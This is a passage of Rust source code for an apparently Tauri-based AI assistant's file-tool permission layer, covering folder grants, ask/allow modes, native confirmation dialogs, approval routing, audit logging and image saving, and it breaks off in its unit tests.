    // B2: protected-scope policy — the app data dir (tool config, audit
    // log, profiles, chat DB), the filesystem root, $HOME itself, and any
    // folder that CONTAINS the app data dir are all rejected. The whole
    // computer is only reachable through the explicit computer-wide mode.
    grants::validate_grant_scope(&canonical, &dir, std::env::home_dir().as_deref())?;
    let mut store = load_store(&dir)?;
    let grant_id = uuid::Uuid::new_v4().to_string();
    let grant = store
        .add_grant(
            grant_id,
            &profile_id,
            canonical.clone(),
            audit::timestamp_now_rfc3339(),
        )
        .map_err(|err| Rejection::new("io", err))?;
    grants::save(&dir, &store).map_err(|err| Rejection::new("io", err))?;
    audit_event(
        &dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "grant_add".into(),
            action: "grant".into(),
            outcome: "ok".into(),
            grant_id: Some(grant.id.clone()),
            profile_id: Some(profile_id.clone()),
            detail: Some(format!("granted folder {}", canonical.display())),
        },
    )?;
    if requested_mode == ApprovalMode::Allow {
        return apply_mode(&app, &dir, &grant.id, ApprovalMode::Allow)
            .await
            .map(Some);
    }
    Ok(Some(grant))
}

/// Native confirmation before a grant stops asking (S13). The renderer
/// cannot fake it, so a compromised renderer cannot silently switch a
/// folder to `allow`.
async fn confirm_allow_mode(app: &AppHandle, folder: &Path) -> bool {
    let dialog_app = app.clone();
    let text = format!(
        "El asistente podrá leer, crear, cambiar, mover y borrar archivos en esta \
         carpeta SIN preguntarte cada vez:\n\n{}\n\nTambién podrá ejecutar órdenes \
         dentro de ella sin preguntar, si tienes activadas las órdenes.\n\n\
         Las carpetas protegidas y los archivos sensibles siguen bloqueados. \
         Puedes volver a \"Preguntar siempre\" cuando quieras.",
        folder.display()
    );
    off_main_thread(move || {
        native_confirm(
            &dialog_app,
            "Permitir sin preguntar",
            text,
            "Permitir sin preguntar",
            "Cancelar",
        )
    })
    .await
    .unwrap_or(false)
}

/// Switch a grant's mode: `allow` only after the native confirmation
/// (declined → the grant stays as it is). Audited as a settings event.
async fn apply_mode(
    app: &AppHandle,
    dir: &Path,
    grant_id: &str,
    mode: ApprovalMode,
) -> Result<grants::Grant, Rejection> {
    let current = load_store(dir)?
        .grant_by_id(grant_id)
        .cloned()
        .ok_or_else(|| Rejection::new("not_found", "no grant with this id"))?;
    if mode == ApprovalMode::Allow {
        if current.scope == GrantScope::ComputerWide {
            return Err(Rejection::new(
                "scope",
                "computer-wide access always asks before every action",
            ));
        }
        if current.mode != ApprovalMode::Allow
            && !confirm_allow_mode(app, &current.canonical_path).await
        {
            audit_event(
                dir,
                AuditEntry {
                    ts: audit::timestamp_now_rfc3339(),
                    event: "settings".into(),
                    action: "grant_mode".into(),
                    outcome: "ignored".into(),
                    grant_id: Some(grant_id.to_string()),
                    profile_id: Some(current.profile_id.clone()),
                    detail: Some("allow mode declined in the native dialog".into()),
                },
            )?;
            return Ok(current);
        }
    }
    // Reload after the (possibly long) dialog: never write back a stale store.
    let mut store = load_store(dir)?;
    let updated = store.set_mode(grant_id, mode)?;
    grants::save(dir, &store).map_err(|err| Rejection::new("io", err))?;
    audit_event(
        dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "settings".into(),
            action: "grant_mode".into(),
            outcome: "ok".into(),
            grant_id: Some(grant_id.to_string()),
            profile_id: Some(updated.profile_id.clone()),
            detail: Some(format!(
                "mode {} for {}",
                match mode {
                    ApprovalMode::Ask => "ask",
                    ApprovalMode::Allow => "allow",
                },
                updated.canonical_path.display()
            )),
        },
    )?;
    Ok(updated)
}

/// The EFFECTIVE approval mode of a grant (computer-wide always `ask`).
#[tauri::command]
pub fn tools_grant_mode_get(app: AppHandle, grant_id: String) -> Result<ApprovalMode, Rejection> {
    let dir = data_dir(&app).map_err(|err| Rejection::new("io", err))?;
    load_store(&dir)?
        .grant_by_id(&grant_id)
        .map(grants::Grant::effective_mode)
        .ok_or_else(|| Rejection::new("not_found", "no grant with this id"))
}

/// Switch a grant between `ask` and `allow` (Settings, S13). `allow`
/// requires the native confirmation; computer-wide grants refuse `allow`.
/// Returns the grant as stored afterwards (unchanged when declined).
///
/// `async` on purpose (P0-3): it may show a native dialog.
#[tauri::command]
pub async fn tools_grant_set_mode(
    app: AppHandle,
    grant_id: String,
    mode: String,
) -> Result<grants::Grant, Rejection> {
    let mode = ApprovalMode::parse(&mode)?;
    let dir = data_dir(&app).map_err(|err| Rejection::new("io", err))?;
    apply_mode(&app, &dir, &grant_id, mode).await
}

/// Native warning shown before the computer-wide mode is enabled. Plain
/// language: the target user is not technical.
const COMPUTER_WIDE_WARNING: &str = "Vas a dar acceso a TODO tu equipo.\n\n\
El asistente podrá pedirte permiso para leer, crear o cambiar cualquier \
archivo de tu usuario: documentos, fotos, descargas…\n\n\
Seguirá pidiéndote confirmación antes de CADA acción, pero si aceptas algo \
por error puede borrar o estropear archivos importantes.\n\n\
Úsalo solo si sabes lo que estás haciendo. Puedes volver a una carpeta \
privada en cualquier momento.";

/// Enable the computer-wide workspace mode for a profile (P1-5): a grant
/// rooted at `$HOME` with scope `computer_wide`. The core accepts it ONLY
/// after the user confirms a NATIVE warning dialog (the renderer cannot
/// fake that confirmation). Per-action approval still applies to every tool
/// action, and the app data dir stays off limits. Returns None when the
/// user declines.
#[tauri::command]
pub async fn tools_grant_computer_wide(
    app: AppHandle,
    profile_id: String,
) -> Result<Option<grants::Grant>, Rejection> {
    let dir = data_dir(&app).map_err(|err| Rejection::new("io", err))?;
    if !profile::is_known_profile_id(&profile_id) {
        return Err(Rejection::new("protocol", "unknown profile"));
    }
    let home = std::env::home_dir()
        .ok_or_else(|| Rejection::new("protocol", "cannot locate your user folder"))?;
    let canonical_home = std::fs::canonicalize(&home)
        .map_err(|err| Rejection::new("io", format!("cannot resolve user folder: {err}")))?;
    grants::validate_computer_wide_root(&canonical_home, &dir)?;

    let dialog_app = app.clone();
    let confirmed = off_main_thread(move || {
        native_confirm(
            &dialog_app,
            "Acceso a todo el equipo",
            COMPUTER_WIDE_WARNING.to_string(),
            "Activar bajo mi responsabilidad",
            "Cancelar",
        )
    })
    .await
    .unwrap_or(false);
    if !confirmed {
        audit_event(
            &dir,
            AuditEntry {
                ts: audit::timestamp_now_rfc3339(),
                event: "grant_add".into(),
                action: "grant".into(),
                outcome: "ignored".into(),
                grant_id: None,
                profile_id: Some(profile_id),
                detail: Some("computer-wide mode declined in the native dialog".into()),
            },
        )?;
        return Ok(None);
    }

    let mut store = load_store(&dir)?;
    let grant = store.add_computer_wide_grant(
        uuid::Uuid::new_v4().to_string(),
        &profile_id,
        canonical_home.clone(),
        audit::timestamp_now_rfc3339(),
    );
    grants::save(&dir, &store).map_err(|err| Rejection::new("io", err))?;
    audit_event(
        &dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "grant_add".into(),
            action: "grant".into(),
            outcome: "ok".into(),
            grant_id: Some(grant.id.clone()),
            profile_id: Some(profile_id),
            detail: Some(format!(
                "computer-wide mode enabled at {}",
                canonical_home.display()
            )),
        },
    )?;
    Ok(Some(grant))
}

#[tauri::command]
pub fn tools_grant_list(app: AppHandle) -> Result<Vec<grants::Grant>, String> {
    let dir = data_dir(&app)?;
    let store = grants::load_or_seed(&dir)?;
    Ok(store.grants)
}

#[tauri::command]
pub fn tools_grant_revoke(app: AppHandle, grant_id: String) -> Result<bool, String> {
    let dir = data_dir(&app)?;
    let mut store = grants::load_or_seed(&dir)?;
    let removed = store.revoke(&grant_id);
    if removed {
        grants::save(&dir, &store)?;
        audit::append(
            &dir,
            &AuditEntry {
                ts: audit::timestamp_now_rfc3339(),
                event: "grant_revoke".into(),
                action: "grant".into(),
                outcome: "ok".into(),
                grant_id: Some(grant_id),
                profile_id: None,
                detail: None,
            },
        )?;
    }
    Ok(removed)
}

#[tauri::command]
pub fn tools_settings_get(app: AppHandle) -> Result<ToolsSettingsView, String> {
    let dir = data_dir(&app)?;
    let store = grants::load_or_seed(&dir)?;
    Ok(ToolsSettingsView {
        tools_allow_run_command: store.tools_allow_run_command,
    })
}

/// `async` on purpose (P0-3): enabling shows a native dialog — see the
/// regression note at the top of this section.
#[tauri::command]
pub async fn tools_set_run_command_enabled(app: AppHandle, enabled: bool) -> Result<(), String> {
    if enabled {
        // B1: re-enabling the shell tool must be confirmed by a NATIVE
        // dialog the renderer cannot fake (S15: ON by default, but a switch
        // the user turned off is only turned back on by the user).
        let dialog_app = app.clone();
        let confirmed = off_main_thread(move || {
            native_confirm(
                &dialog_app,
                "Ejecutar órdenes",
                "El asistente podrá EJECUTAR ÓRDENES en tu equipo, dentro de tus carpetas \
                 de trabajo.\n\nUna orden puede hacer cualquier cosa que harías tú: leer \
                 archivos, usar internet o cambiar ajustes. Te pedirá confirmación antes de \
                 cada una, salvo en carpetas que tengas en \"Permitir sin preguntar\"."
                    .to_string(),
                "Activar",
                "Cancelar",
            )
        })
        .await
        .unwrap_or(false);
        if !confirmed {
            let dir = data_dir(&app)?;
            audit::append(
                &dir,
                &AuditEntry {
                    ts: audit::timestamp_now_rfc3339(),
                    event: "settings".into(),
                    action: "run_command".into(),
                    outcome: "ignored".into(),
                    grant_id: None,
                    profile_id: None,
                    detail: Some("user declined the native confirmation dialog".into()),
                },
            )?;
            return Err("declined".into());
        }
    }
    let dir = data_dir(&app)?;
    let mut store = grants::load_or_seed(&dir)?;
    store.set_run_command_enabled(enabled);
    grants::save(&dir, &store)?;
    audit::append(
        &dir,
        &AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "settings".into(),
            action: "run_command".into(),
            outcome: "ok".into(),
            grant_id: None,
            profile_id: None,
            detail: Some(if enabled { "enabled" } else { "disabled" }.to_string()),
        },
    )?;
    Ok(())
}

// ------------------------------------------------- model tool calls --
//
// The renderer can no longer propose or execute tool actions (the old
// tools_propose / tools_execute / tools_deny / tools_audit_tail IPC test
// surface is gone): only the model, through the chat core's tool loop, can
// ask for an action, and every single one goes through a native dialog.

/// Longest change preview shown in a confirmation dialog.
const PREVIEW_MAX_LINES: usize = 14;
const PREVIEW_MAX_CHARS: usize = 1_200;

/// The first lines of a proposal's unified diff, for the dialog.
fn diff_preview(diff: &str) -> String {
    let lines: Vec<&str> = diff
        .lines()
        .filter(|line| !line.starts_with("---") && !line.starts_with("+++"))
        .collect();
    let mut preview: String = lines
        .iter()
        .take(PREVIEW_MAX_LINES)
        .copied()
        .collect::<Vec<_>>()
        .join("\n")
        .chars()
        .take(PREVIEW_MAX_CHARS)
        .collect();
    if lines.len() > PREVIEW_MAX_LINES || preview.chars().count() >= PREVIEW_MAX_CHARS {
        preview.push_str("\n…");
    }
    preview
}

/// Plain-language confirmation for one proposed action (Spanish UI copy):
/// (dialog title, dialog text). Shows exactly what will be touched; for
/// writes, a short preview of the change (the proposal's diff). Reads never
/// echo any file content.
pub fn confirmation_text(
    action: &ToolAction,
    summary: &str,
    diff: Option<&str>,
) -> (String, String) {
    let (title, mut text) = confirmation_base(action, summary);
    if let Some(diff) = diff.filter(|diff| !diff.trim().is_empty()) {
        text.push_str("\n\nCambios:\n");
        text.push_str(&diff_preview(diff));
    }
    (title, text)
}

fn confirmation_base(action: &ToolAction, summary: &str) -> (String, String) {
    match action {
        ToolAction::ReadFile { path } => (
            "Leer un archivo".into(),
            format!("El asistente quiere LEER este archivo:\n\n{path}\n\n¿Se lo permites?"),
        ),
        ToolAction::ListFiles { path } => (
            "Ver una carpeta".into(),
            format!(
                "El asistente quiere VER qué hay en esta carpeta:\n\n{path}\n\n¿Se lo permites?"
            ),
        ),
        ToolAction::WriteFile { path, .. } => (
            "Crear o reemplazar un archivo".into(),
            format!(
                "El asistente quiere CREAR o REEMPLAZAR este archivo:\n\n{path}\n\n\
                 ({summary})\n\nSi el archivo ya existe, su contenido se sustituirá. \
                 ¿Se lo permites?"
            ),
        ),
        ToolAction::ReplaceFile { path, .. } => (
            "Modificar un archivo".into(),
            format!(
                "El asistente quiere MODIFICAR este archivo:\n\n{path}\n\n({summary})\n\n\
                 ¿Se lo permites?"
            ),
        ),
        ToolAction::RunCommand { cmd, cwd_in_grant } => (
            "Ejecutar una orden".into(),
            format!(
                "El asistente quiere EJECUTAR esta orden:\n\n{cmd}\n\nen la carpeta:\n\
                 {cwd_in_grant}\n\nUna orden puede cambiar cosas en tu equipo. \
                 ¿Se lo permites?"
            ),
        ),
        ToolAction::MovePath {
            from,
            to,
            overwrite,
        } => (
            "Mover o renombrar".into(),
            format!(
                "El asistente quiere MOVER o RENOMBRAR:\n\n{from}\n\na:\n\n{to}\n\n{}\
                 ¿Se lo permites?",
                if *overwrite && summary.contains("replaces the existing file") {
                    "Ya existe un archivo con ese nombre y se SUSTITUIRÁ.\n\n"
                } else {
                    ""
                }
            ),
        ),
        ToolAction::SaveImage { path, .. } => (
            "Guardar una imagen".into(),
            format!(
                "El asistente quiere GUARDAR la imagen que ha creado en:\n\n{path}\n\n{}\
                 ¿Se lo permites?",
                if summary.contains("replaces the existing file") {
                    "Ya existe un archivo con ese nombre y se SUSTITUIRÁ.\n\n"
                } else {
                    ""
                }
            ),
        ),
        ToolAction::DeletePath { path } => (
            "Borrar".into(),
            if summary.contains("PERMANENT") {
                format!(
                    "El asistente quiere BORRAR DEFINITIVAMENTE:\n\n{path}\n\n\
                     No hay papelera disponible en este disco: NO se podrá recuperar. \
                     ¿Se lo permites?"
                )
            } else {
                format!(
                    "El asistente quiere BORRAR:\n\n{path}\n\nSe moverá a la papelera, \
                     desde donde podrás recuperarlo. ¿Se lo permites?"
                )
            },
        ),
    }
}

// ------------------------------------------------------ approval route --

/// How one proposal gets approved (S13/S14).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalRoute {
    /// Every grant the action touches is in `allow` mode: no prompt.
    Auto,
    /// `ask` mode: an inline card in the chat stream.
    Inline,
    /// A computer-wide grant is involved: the native per-action dialog,
    /// always, whatever the stored mode.
    Native,
}

/// Decide the approval route from the CURRENT store. Every grant the
/// proposal touches (the source/cwd grant and, for move_path, the
/// destination grant) must be in effective `allow` mode for `Auto`; any
/// computer-wide grant forces `Native`; a missing grant fails closed to
/// `Inline` (execute rejects it anyway). run_command follows the same rule
/// through its cwd grant: it asks in `ask` mode and runs without a prompt
/// only when its cwd sits in an `allow`-mode grant. The always-refused
/// deny-lists were applied at propose time and are applied again at
/// execute time, so `Auto` never reaches them.
pub fn approval_route(store: &GrantsStore, proposal: &PendingProposal) -> ApprovalRoute {
    let Some(grant_id) = proposal.grant_id.as_deref() else {
        return ApprovalRoute::Inline;
    };
    let mut all_allow = true;
    for id in std::iter::once(grant_id).chain(proposal.dest_grant_id.as_deref()) {
        let Some(grant) = store.grant_by_id(id) else {
            return ApprovalRoute::Inline;
        };
        if grant.scope == GrantScope::ComputerWide {
            return ApprovalRoute::Native;
        }
        if grant.effective_mode() != ApprovalMode::Allow {
            all_allow = false;
        }
    }
    if all_allow {
        ApprovalRoute::Auto
    } else {
        ApprovalRoute::Inline
    }
}

/// The approval request card for a stored proposal (built by the core).
pub fn approval_request(proposal: &PendingProposal) -> ApprovalRequest {
    let (title, text) = confirmation_text(
        &proposal.action,
        &proposal.summary,
        proposal.diff.as_deref(),
    );
    let (path, dest_path, command) = match &proposal.action {
        ToolAction::ReadFile { path }
        | ToolAction::ListFiles { path }
        | ToolAction::WriteFile { path, .. }
        | ToolAction::ReplaceFile { path, .. }
        | ToolAction::DeletePath { path }
        | ToolAction::SaveImage { path, .. } => (Some(path.clone()), None, None),
        ToolAction::MovePath { from, to, .. } => (Some(from.clone()), Some(to.clone()), None),
        ToolAction::RunCommand { cmd, cwd_in_grant } => {
            (Some(cwd_in_grant.clone()), None, Some(cmd.clone()))
        }
    };
    ApprovalRequest {
        approval_id: String::new(),
        conversation_id: proposal.conversation_id,
        action: proposal.action.kind().to_string(),
        title,
        text,
        summary: proposal.summary.clone(),
        path,
        dest_path,
        command,
        diff_preview: proposal
            .diff
            .as_deref()
            .filter(|diff| !diff.trim().is_empty())
            .map(diff_preview),
        permanent: proposal.permanent_delete,
        expires_in_secs: PROPOSAL_TTL.as_secs(),
    }
}

/// The two user-facing approval affordances. Production: native dialog +
/// inline card over IPC ([`AppApprover`]); tests: a recording fake.
pub(crate) trait Approver {
    /// Native per-action dialog (computer-wide).
    fn native(&self, title: String, text: String) -> impl Future<Output = bool> + Send;
    /// Inline card: `request.approval_id` is empty, the approver registers
    /// the pending request and fills it in.
    fn inline(&self, request: ApprovalRequest) -> impl Future<Output = bool> + Send;
    /// Told the outcome of a native decision (informational only: the
    /// renderer counts approvals for its allow-mode suggestion).
    fn native_decided(&self, _request: &ApprovalRequest, _granted: bool) {}
}

/// `tools://approval-native` payload: the outcome of a native per-action
/// dialog. Informational; it carries no capability.
#[derive(Debug, Clone, Serialize)]
pub struct NativeDecision {
    pub conversation_id: Option<i64>,
    pub action: String,
    pub path: Option<String>,
    pub granted: bool,
}

/// Route and obtain approval for a stored proposal. `Auto` is audited as an
/// approval by mode; a declined/expired prompt discards the proposal
/// (audited deny) and returns `declined`.
pub(crate) async fn approve_proposal<A: Approver>(
    dir: &Path,
    state: &ToolsState,
    approver: &A,
    proposal: &PendingProposal,
) -> Result<ApprovalRoute, Rejection> {
    let route = approval_route(&load_store(dir)?, proposal);
    let approved = match route {
        ApprovalRoute::Auto => {
            audit_event(
                dir,
                AuditEntry {
                    ts: audit::timestamp_now_rfc3339(),
                    event: "approve".into(),
                    action: proposal.action.kind().into(),
                    outcome: "ok".into(),
                    grant_id: proposal.grant_id.clone(),
                    profile_id: Some(proposal.profile_id.clone()),
                    detail: Some("approved by the grant's allow mode (no prompt)".into()),
                },
            )?;
            true
        }
        ApprovalRoute::Native => {
            let (title, text) = confirmation_text(
                &proposal.action,
                &proposal.summary,
                proposal.diff.as_deref(),
            );
            let granted = approver.native(title, text).await;
            approver.native_decided(&approval_request(proposal), granted);
            granted
        }
        ApprovalRoute::Inline => approver.inline(approval_request(proposal)).await,
    };
    if !approved {
        deny(dir, state, &proposal.id).map_err(|msg| Rejection::new("io", msg))?;
        return Err(Rejection::new(
            "declined",
            "the user did not allow this action",
        ));
    }
    Ok(route)
}

/// Production approver: native dialogs through the dialog plugin, inline
/// cards through `tools://approval-request` / `tools_approval_respond`.
pub(crate) struct AppApprover {
    pub app: AppHandle,
}

impl Approver for AppApprover {
    fn native(&self, title: String, text: String) -> impl Future<Output = bool> + Send {
        let app = self.app.clone();
        async move {
            off_main_thread(move || native_confirm(&app, &title, text, "Permitir", "No permitir"))
                .await
                .unwrap_or(false)
        }
    }

    fn inline(&self, mut request: ApprovalRequest) -> impl Future<Output = bool> + Send {
        let app = self.app.clone();
        async move {
            let state = app.state::<ToolsState>();
            let Ok(ticket) = state.approvals.register() else {
                return false;
            };
            request.approval_id = ticket.id.clone();
            let approval_id = ticket.id.clone();
            if app.emit("tools://approval-request", &request).is_err() {
                return false;
            }
            let granted = ticket.wait(PROPOSAL_TTL).await;
            let _ = app.emit(
                "tools://approval-resolved",
                approvals::ApprovalResolved {
                    approval_id,
                    granted,
                },
            );
            granted
        }
    }

    fn native_decided(&self, request: &ApprovalRequest, granted: bool) {
        let _ = self.app.emit(
            "tools://approval-native",
            NativeDecision {
                conversation_id: request.conversation_id,
                action: request.action.clone(),
                path: request.path.clone(),
                granted,
            },
        );
    }
}

/// Answer a pending inline approval (S14). The renderer can only answer a
/// request the core created and is still waiting on; anything else is
/// rejected (`unknown_approval`) and audited as a security signal.
#[tauri::command]
pub fn tools_approval_respond(
    app: AppHandle,
    approval_id: String,
    granted: bool,
) -> Result<(), Rejection> {
    let state = app.state::<ToolsState>();
    let result = state.approvals.respond(&approval_id, granted);
    if let Err(rejection) = &result {
        let dir = data_dir(&app).map_err(|err| Rejection::new("io", err))?;
        audit_event(
            &dir,
            AuditEntry {
                ts: audit::timestamp_now_rfc3339(),
                event: "approve".into(),
                action: "unknown".into(),
                outcome: "rejected".into(),
                grant_id: None,
                profile_id: None,
                detail: Some(format!("{}: {}", rejection.kind, rejection.message)),
            },
        )?;
    }
    result
}

/// The model asked for a tool action during a chat (chat.rs tool loop):
/// propose (grant + scope validation, audit) → approval by route (no
/// prompt in `allow` mode, inline card in `ask` mode, native dialog for
/// computer-wide) → execute the exact stored action. A declined or expired
/// approval is audited as a deny and reported as `declined`.
pub(crate) async fn run_model_action(
    app: &AppHandle,
    profile_id: &str,
    conversation_id: i64,
    action: ToolAction,
) -> Result<ToolOutcome, Rejection> {
    let dir = data_dir(app).map_err(|err| Rejection::new("io", err))?;
    let proposal = {
        let state = app.state::<ToolsState>();
        propose(&dir, &state, profile_id, Some(conversation_id), &action)?
    };
    let approver = AppApprover { app: app.clone() };
    {
        let state = app.state::<ToolsState>();
        approve_proposal(&dir, &state, &approver, &proposal).await?;
    }
    // Execution may run a command for up to 30 s: keep it off the runtime.
    let exec_app = app.clone();
    let proposal_id = proposal.id.clone();
    off_main_thread(move || {
        let state = exec_app.state::<ToolsState>();
        execute(&dir, &state, &proposal_id)
    })
    .await
    .unwrap_or_else(|| Err(Rejection::new("io", "tool execution was interrupted")))
}

// ------------------------------------------- generate_image save_path --

/// Outcome of a `generate_image` `save_path` copy (round 6).
#[derive(Debug)]
pub enum ImageSave {
    /// Copied to `save_path`, inside a grant, approved by the grant's mode.
    Saved(ToolOutcome),
    /// `save_path` is outside every grant of the conversation: the copy
    /// went to the session temp folder instead (always with the inline
    /// approval) and the model is told to ask the user for the folder.
    SavedToTemp {
        requested: String,
        outcome: ToolOutcome,
    },
    /// Not saved anywhere (declined, deny-list, missing folder, …).
    /// `outside`: the requested path was outside every grant.
    Failed {
        requested: String,
        outside: bool,
        rejection: Rejection,
    },
}

impl ImageSave {
    /// The file the image was copied to, when the copy happened.
    pub fn saved_path(&self) -> Option<&str> {
        match self {
            ImageSave::Saved(outcome) | ImageSave::SavedToTemp { outcome, .. } => {
                outcome.produced.first().map(String::as_str)
            }
            ImageSave::Failed { .. } => None,
        }
    }
}

/// Whether `save_path` is outside every grant the conversation may use
/// (the only case that falls back to the session temp folder; any other
/// rejection — deny-list, traversal, bad extension — is reported as is).
fn outside_every_grant(
    dir: &Path,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: i64,
    save_path: &str,
) -> Result<bool, Rejection> {
    let store = effective_store(&load_store(dir)?, state, profile_id, Some(conversation_id))?;
    Ok(matches!(
        grants::resolve_under_grant(&store, profile_id, save_path),
        Err(rejection) if rejection.kind == "escape" || rejection.kind == "no_grant"
    ))
}

/// Copy a just-generated image (`source`, under `app_data/images`) to the
/// model's `save_path`: propose a [`ToolAction::SaveImage`] (write_file's
/// rules: grant scope, deny-list, symlink walk), approve it by the grant's
/// route, execute. A `save_path` outside every grant targets the session
/// temp folder instead (inline approval, the card shows that destination).
pub(crate) async fn save_generated_image<A: Approver>(
    dir: &Path,
    state: &ToolsState,
    approver: &A,
    profile_id: &str,
    conversation_id: i64,
    source: &Path,
    save_path: &str,
) -> ImageSave {
    let requested = save_path.trim().to_string();
    let outside = match outside_every_grant(dir, state, profile_id, conversation_id, &requested) {
        Ok(outside) => outside,
        Err(rejection) => {
            return ImageSave::Failed {
                requested,
                outside: false,
                rejection,
            };
        }
    };
    let target = if outside {
        // Keep the requested file name when it is an image name (its
        // extension is then matched to the image's format by
        // `validate_save_image`), else the generated one; never any of the
        // requested folders.
        let requested_name = Path::new(&requested)
            .file_name()
            .filter(|name| {
                Path::new(name).extension().is_some_and(|ext| {
                    ["png", "jpg", "jpeg"]
                        .iter()
                        .any(|e| ext.eq_ignore_ascii_case(e))
                })
            })
            .or_else(|| source.file_name())
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("image.png"));
        state
            .scratch_dir(conversation_id)
            .join(requested_name)
            .display()
            .to_string()
    } else {
        requested.clone()
    };
    let action = ToolAction::SaveImage {
        source: source.display().to_string(),
        path: target,
    };
    let result: Result<ToolOutcome, Rejection> = async {
        let proposal = propose_in(
            dir,
            state,
            profile_id,
            Some(conversation_id),
            &action,
            outside,
        )?;
        approve_proposal(dir, state, approver, &proposal).await?;
        execute(dir, state, &proposal.id)
    }
    .await;
    match result {
        Ok(outcome) if outside => ImageSave::SavedToTemp { requested, outcome },
        Ok(outcome) => ImageSave::Saved(outcome),
        Err(rejection) => ImageSave::Failed {
            requested,
            outside,
            rejection,
        },
    }
}

/// [`save_generated_image`] against the running app (inline cards over
/// IPC, native dialog for computer-wide).
pub(crate) async fn save_model_image(
    app: &AppHandle,
    profile_id: &str,
    conversation_id: i64,
    source: &Path,
    save_path: &str,
) -> ImageSave {
    let dir = match data_dir(app) {
        Ok(dir) => dir,
        Err(err) => {
            return ImageSave::Failed {
                requested: save_path.to_string(),
                outside: false,
                rejection: Rejection::new("io", err),
            };
        }
    };
    let approver = AppApprover { app: app.clone() };
    let state = app.state::<ToolsState>();
    save_generated_image(
        &dir,
        &state,
        &approver,
        profile_id,
        conversation_id,
        source,
        save_path,
    )
    .await
}

/// The `save` field of the `generate_image` tool result.
pub fn image_save_for_model(save: &ImageSave) -> serde_json::Value {
    const ASK_FOR_FOLDER: &str = "It is outside the user's working folders. Tell the user and \
         ask them to add that folder in the folder picker; once it is a working folder you can \
         save there.";
    match save {
        ImageSave::Saved(outcome) => serde_json::json!({
            "saved": true,
            "saved_to": outcome.produced.first(),
        }),
        ImageSave::SavedToTemp { requested, outcome } => serde_json::json!({
            "saved": true,
            "saved_to": outcome.produced.first(),
            "requested_path": requested,
            "message": format!(
                "NOT saved at the requested path: {ASK_FOR_FOLDER} Meanwhile it was saved \
                 to this session's temporary folder (saved_to)."
            ),
        }),
        ImageSave::Failed {
            requested,
            outside,
            rejection,
        } => {
            let message = if *outside {
                format!("NOT saved: {ASK_FOR_FOLDER}")
            } else {
                format!(
                    "NOT saved at save_path ({}). Tell the user; if they declined, do not retry.",
                    rejection.message
                )
            };
            serde_json::json!({
                "saved": false,
                "requested_path": requested,
                "error": rejection.kind,
                "message": message,
            })
        }
    }
}

/// Where the assistant may work for one profile.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Workspace {
    /// Canonical grant roots (folders, or `$HOME` in computer-wide mode).
    pub roots: Vec<PathBuf>,
    pub computer_wide: bool,
    pub run_command: bool,
    /// Set when the conversation has NO folder selected: the only root is
    /// this session temp folder, and the model is told to ask where to
    /// save before writing.
    pub scratch: Option<PathBuf>,
}

/// The profile's workspace, or None when no folder is granted (the chat
/// then offers no file tools at all).
pub fn workspace_from_store(store: &GrantsStore, profile_id: &str) -> Option<Workspace> {
    let grants = store.grants_for(profile_id);
    let roots: Vec<PathBuf> = grants
        .iter()
        .map(|grant| grant.canonical_path.clone())
        .collect();
    if roots.is_empty() {
        return None;
    }
    let scratch = grants
        .iter()
        .find(|grant| grant.id.starts_with(SCRATCH_GRANT_PREFIX))
        .map(|grant| grant.canonical_path.clone());
    Some(Workspace {
        roots,
        computer_wide: store.computer_wide_grant(profile_id).is_some(),
        run_command: store.tools_allow_run_command,
        scratch,
    })
}

/// The workspace one conversation sees ([`effective_store`]).
pub fn workspace_for_conversation_in(
    dir: &Path,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: i64,
) -> Option<Workspace> {
    let store = grants::load_or_seed(dir).ok()?;
    let store = effective_store(&store, state, profile_id, Some(conversation_id)).ok()?;
    workspace_from_store(&store, profile_id)
}

/// [`workspace_for_conversation_in`] against the app's own tools store.
pub(crate) fn workspace_for(
    app: &AppHandle,
    profile_id: &str,
    conversation_id: i64,
) -> Option<Workspace> {
    let dir = data_dir(app).ok()?;
    let state = app.state::<ToolsState>();
    workspace_for_conversation_in(&dir, &state, profile_id, conversation_id)
}

// --------------------------------------------------------------- tests --

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    // ---- round 17: output roles ------------------------------------------

    #[test]
    fn a_command_declares_its_document_the_deliverable_and_the_rest_byproducts() {
        // The owner's slide deck turn: the render command leaves the PDF,
        // a cover rasterisation named after it, and slide renders.
        let produced: Vec<String> = [
            "/w/Cristian-Cordova-Helmcode.pdf",
            "/w/Cristian-Cordova-Helmcode.pdf.png",
            "/w/s0.png",
            "/w/fonts/Roboto-Regular.ttf",
        ]
        .iter()
        .map(|p| p.to_string())
        .collect();
        assert_eq!(
            declare_outputs("run_command", &produced),
            vec![
                DeclaredOutput::deliverable(
                    "/w/Cristian-Cordova-Helmcode.pdf",
                    DeliverableKind::Document
                ),
                DeclaredOutput::byproduct("/w/Cristian-Cordova-Helmcode.pdf.png"),
                DeclaredOutput::byproduct("/w/s0.png"),
                DeclaredOutput::byproduct("/w/fonts/Roboto-Regular.ttf"),
            ]
        );
    }

    #[test]
    fn document_formats_are_recognised_case_insensitively() {
        for path in [
            "/a/x.pdf",
            "/a/X.PDF",
            "/a/deck.pptx",
            "/a/q.xlsx",
            "/a/r.docx",
            "/a/b.odt",
        ] {
            assert!(is_document_path(path), "{path}");
        }
        for path in [
            "/a/x.pdf.png",
            "/a/index.html",
            "/a/check.js",
            "/a/pdf",
            "/a/notes.md",
        ] {
            assert!(!is_document_path(path), "{path}");
        }
    }

    #[test]
    fn a_renamed_document_stays_the_deliverable_and_writes_are_undeclared() {
        assert_eq!(
            declare_outputs("move_path", &["/w/final.pdf".to_string()]),
            vec![DeclaredOutput::deliverable(
                "/w/final.pdf",
                DeliverableKind::Document
            )]
        );
        assert!(declare_outputs("move_path", &["/w/a.png".to_string()]).is_empty());
        // write_file / replace_file: byproduct unless the final message
        // names the file (the renderer's rule), so nothing is declared.
        for kind in [
            "write_file",
            "replace_file",
            "save_image",
            "read_file",
            "delete_path",
        ] {
            assert!(
                declare_outputs(kind, &["/w/report.pdf".to_string()]).is_empty(),
                "{kind}"
            );
        }
    }

    #[test]
